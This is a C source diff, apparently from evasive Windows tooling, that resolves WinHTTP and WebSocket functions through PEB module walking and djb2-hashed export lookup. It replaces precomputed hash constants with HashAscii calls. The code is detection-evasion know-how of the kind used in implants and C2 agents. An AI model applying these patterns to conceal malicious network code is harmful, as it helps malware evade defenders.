@@ -2,11 +2,11 @@
 #include "system.h"
 #include "ntdll.h"
 #include "stackstrings.h"
-#include "apihash.h"
+#include "djb2.h"
 
 static PVOID GetWinHttp()
 {
-    PVOID base = GetModuleHandleFromPEB(HASH_MOD_WINHTTP);
+    PVOID base = GetModuleHandleFromPEB(HashAscii("winhttp.dll"));
     if (base != NULL)
         return base;
 
@@ -40,27 +40,27 @@ BOOL WINHTTP_API_Ctor(WINHTTP_API *api)
         return FALSE;
 
     api->WinHttpCrackUrl = (BOOL (WINAPI *)(const WCHAR *, DWORD, DWORD, URL_COMPONENTS *))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPCRACKURL);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpCrackUrl"));
     api->WinHttpWebSocketSend = (DWORD (WINAPI *)(HINTERNET, WINHTTP_WEB_SOCKET_BUFFER_TYPE, PVOID, DWORD))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETSEND);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpWebSocketSend"));
     api->WinHttpWebSocketReceive = (DWORD (WINAPI *)(HINTERNET, PVOID, DWORD, DWORD *, WINHTTP_WEB_SOCKET_BUFFER_TYPE *))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETRECEIVE);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpWebSocketReceive"));
     api->WinHttpOpen = (HINTERNET (WINAPI *)(const WCHAR *, DWORD, const WCHAR *, const WCHAR *, DWORD))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPOPEN);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpOpen"));
     api->WinHttpConnect = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *, UINT16, DWORD))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPCONNECT);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpConnect"));
     api->WinHttpOpenRequest = (HINTERNET (WINAPI *)(HINTERNET, const WCHAR *, const WCHAR *, WCHAR *, const WCHAR *, WCHAR **, DWORD))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPOPENREQUEST);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpOpenRequest"));
     api->WinHttpSetOption = (BOOL (WINAPI *)(HINTERNET, DWORD, PVOID, DWORD))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPSETOPTION);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpSetOption"));
     api->WinHttpSendRequest = (BOOL (WINAPI *)(HINTERNET, const WCHAR *, DWORD, PVOID, DWORD, DWORD, ULONG_PTR))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPSENDREQUEST);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpSendRequest"));
     api->WinHttpReceiveResponse = (BOOL (WINAPI *)(HINTERNET, PVOID))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPRECEIVERESPONSE);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpReceiveResponse"));
     api->WinHttpWebSocketCompleteUpgrade = (HINTERNET (WINAPI *)(HINTERNET, ULONG_PTR))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPWEBSOCKETCOMPLETEUPGRADE);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpWebSocketCompleteUpgrade"));
     api->WinHttpCloseHandle = (BOOL (WINAPI *)(HINTERNET))
-                            ResolveExportByHash(winhttp, HASH_WINHTTPCLOSEHANDLE);
+                            ResolveExportByHash(winhttp, HashAscii("WinHttpCloseHandle"));
 
     return (api->WinHttpCrackUrl != NULL &&
             api->WinHttpWebSocketSend != NULL &&
